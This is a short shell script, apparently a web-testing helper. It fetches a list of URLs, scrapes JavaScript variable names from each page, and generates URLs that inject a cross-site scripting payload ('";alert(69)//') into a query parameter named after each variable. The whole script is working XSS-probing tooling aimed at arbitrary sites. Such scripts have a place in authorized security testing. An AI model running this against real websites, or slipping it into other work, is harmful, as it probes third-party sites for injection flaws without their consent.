cat - > tmp
echo "====================== It's gonna be Legen... Wait for it ======================"
cat tmp | concurl -c 100 -d 10 &>/dev/null

cd out

for source in $(find -type f)
do
        url=$(cat $source | head -1 | awk '{print $4}')
        for var in $(cat $source | grep -oP "var [a-z0-9_]+" | awk '{print $2}')
        do
                echo "$url?$var=\";alert(69)//" >> temp
        done
done
cat temp | sort -u
cd .. && rm tmp && rm out -r
echo "======================================= ..DARY! ================================"
